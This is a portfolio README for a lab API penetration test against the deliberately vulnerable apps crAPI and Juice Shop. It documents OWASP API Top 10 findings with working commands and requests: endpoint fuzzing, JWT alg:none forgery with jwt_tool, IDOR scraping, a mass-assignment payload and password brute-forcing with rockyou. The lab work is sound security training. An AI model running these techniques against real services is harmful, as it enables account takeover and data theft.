<div align="center">

# 🔌 Sub-Project 2 — API Security Testing Lab

[![OWASP API](https://img.shields.io/badge/OWASP_API_Top_10-2023-3E4D6C?style=for-the-badge&logo=owasp&logoColor=white)](https://owasp.org/API-Security/)
[![Postman](https://img.shields.io/badge/Postman-FF6C37?style=for-the-badge&logo=postman&logoColor=white)](https://postman.com)
[![Status](https://img.shields.io/badge/Status-Completed-00d4aa?style=for-the-badge)](.)

*REST API penetration test covering all OWASP API Security Top 10 against crAPI and OWASP Juice Shop*

[← Back to Main Project](../README.md)

</div>

---

## 📋 Engagement Summary

| Field | Details |
|-------|---------|
| **Target APIs** | crAPI v1.0 (OWASP), OWASP Juice Shop API |
| **API Types Tested** | REST, JSON, JWT-authenticated |
| **Authentication** | JWT (HS256), Bearer tokens |
| **Attack Machine** | Kali Linux 2024.1 |
| **Testing Type** | Black-box with API documentation review |
| **Methodology** | OWASP API Security Testing Guide |
| **Total Findings** | 11 (4 Critical, 2 High, 4 Medium, 1 Low) |

---

## 🎯 OWASP API Security Top 10 — Coverage

| ID | Category | Tested | Found | Severity |
|----|---------|--------|-------|----------|
| API1 | Broken Object Level Authorization | ✅ | ✅ | 🔴 Critical |
| API2 | Broken Authentication | ✅ | ✅ | 🔴 Critical |
| API3 | Broken Object Property Level Auth | ✅ | ✅ | 🟠 High |
| API4 | Unrestricted Resource Consumption | ✅ | ✅ | 🟡 Medium |
| API5 | Broken Function Level Authorization | ✅ | ✅ | 🟠 High |
| API6 | Unrestricted Access to Sensitive Business Flows | ✅ | ✅ | 🔴 Critical |
| API7 | Server Side Request Forgery | ✅ | ❌ | N/A |
| API8 | Security Misconfiguration | ✅ | ✅ | 🟡 Medium |
| API9 | Improper Inventory Management | ✅ | ✅ | 🔴 Critical |
| API10 | Unsafe Consumption of APIs | ✅ | ✅ | 🟡 Medium |

---

## 🔬 Attack Methodology

### Phase 1 — API Discovery & Mapping

**Objective:** Find every endpoint before testing any of them.

```bash
# Step 1 — Passive discovery from JavaScript and docs
# Check browser DevTools → Network tab while browsing the app
# Look for /api/, /v1/, /v2/, swagger.json, openapi.yaml

# Step 2 — Active endpoint fuzzing with ffuf
ffuf -u http://localhost:8888/FUZZ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt \
  -mc 200,201,301,401,403 \
  -o api_endpoints.txt

# Step 3 — kiterunner — API-aware brute force (much better than gobuster for APIs)
kr scan http://localhost:8888 \
  -w /usr/share/wordlists/kiterunner/routes-small.kite \
  --output-file kiterunner_results.txt

# Step 4 — Build your endpoint map in Postman
# Import all discovered endpoints as a Collection
# Set up environment variables: {{base_url}}, {{token}}, {{user_id}}
```

---

### Phase 2 — Authentication Analysis

**Objective:** Understand and attempt to bypass every auth mechanism.

```bash
# Step 1 — Register a test account and login
POST http://localhost:8888/identity/api/auth/signup
{
  "name": "Test Attacker",
  "email": "attacker@test.com",
  "number": "1234567890",
  "password": "Attacker@123"
}

# Step 2 — Login and capture JWT
POST http://localhost:8888/identity/api/auth/login
{
  "email": "attacker@test.com",
  "password": "Attacker@123"
}
→ Response: {"token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}

# Step 3 — Decode and analyze the JWT
pip3 install jwt
python3 -c "
import jwt, json
token = 'YOUR_TOKEN_HERE'
decoded = jwt.decode(token, options={'verify_signature': False})
print(json.dumps(decoded, indent=2))
"
# Output: {"sub": "attacker@test.com", "iat": 1700000000, "role": "user"}
```

---

### Phase 3 — Exploitation

#### Finding 1 — BOLA / IDOR (API1 — Critical | CVSS 9.1)

**What is it?** The API doesn't verify that you own the resource you're requesting. You can access any user's data by changing the ID.

**Step-by-step exploitation:**

```bash
# Step 1 — Login as attacker, note your user ID from JWT (e.g., id=5)

# Step 2 — Request your own mechanic report
GET /workshop/api/mechanic/mechanic_report?report_id=3
Authorization: Bearer [your_token]
→ Returns YOUR report ✓

# Step 3 — Change the ID to access other users' reports
GET /workshop/api/mechanic/mechanic_report?report_id=1
Authorization: Bearer [your_token]
→ Returns USER 1's PRIVATE REPORT ← BOLA confirmed!

GET /workshop/api/mechanic/mechanic_report?report_id=2
→ Returns USER 2's PRIVATE REPORT ← Same issue

# Step 4 — Automate to scrape all reports
python3 scripts/api_security_tester.py --bola --base-url http://localhost:8888 --token YOUR_TOKEN
```

**Impact:** Any authenticated user can read all other users' private data.

**Remediation:** Implement server-side ownership check: verify `report.owner_id == current_user.id` before returning data.

---

#### Finding 2 — JWT Algorithm Confusion / None Attack (API2 — Critical | CVSS 9.1)

```bash
# Install jwt_tool
git clone https://github.com/ticarpi/jwt_tool.git
cd jwt_tool && pip3 install -r requirements.txt

# Test algorithm confusion attacks
python3 jwt_tool.py YOUR_JWT_TOKEN -X a
# -X a = algorithm confusion (alg:none)

# If successful, jwt_tool outputs a forged token
# The server accepts tokens with alg:none — no signature verification!

# Use the forged token with modified claims:
# Change "role": "user" to "role": "admin" in the payload
# Re-encode with alg:none → use in API request → admin access granted
```

---

#### Finding 3 — Mass Assignment (API6 — Critical | CVSS 8.8)

```bash
# Normal registration request:
POST /identity/api/auth/signup
{
  "name": "Normal User",
  "email": "normal@test.com",
  "number": "9999999999",
  "password": "Password123!"
}

# Mass assignment attack — add extra fields:
POST /identity/api/auth/signup
{
  "name": "Evil Admin",
  "email": "admin2@test.com",
  "number": "8888888888",
  "password": "Password123!",
  "role": "admin",           ← injected
  "isAdmin": true,           ← injected
  "credit": 999999           ← injected
}
# If response shows elevated role or balance → Mass Assignment confirmed
```

---

#### Finding 4 — No Rate Limiting (API4 — Medium | CVSS 5.3)

```bash
# Test with ffuf — send 1000 login requests, see if any are blocked
ffuf \
  -u http://localhost:8888/identity/api/auth/login \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"victim@test.com","password":"FUZZ"}' \
  -w /usr/share/wordlists/rockyou.txt \
  -t 20 \
  -rate 50 \
  -mc 200

# Expected behavior: 429 Too Many Requests after ~10 attempts
# Actual behavior: 200/401 responses continue indefinitely = no rate limiting
```

---

#### Finding 5 — Shadow/Undocumented Admin Endpoints (API9 — Critical)

```bash
# kiterunner found endpoints not listed in Swagger docs:
GET /workshop/api/admin/users          ← not in docs, no auth required!
GET /workshop/api/admin/mechanic       ← admin endpoint exposed
DELETE /workshop/api/admin/user/{id}   ← allows deleting any user

# Verify:
curl http://localhost:8888/workshop/api/admin/users
→ Returns list of ALL users in the system with emails, IDs, phone numbers
```


[← Web VAPT](../01-web-vapt/README.md) | [Back to Main](../README.md) | [AD & Network →](../03-ad-network/README.md)
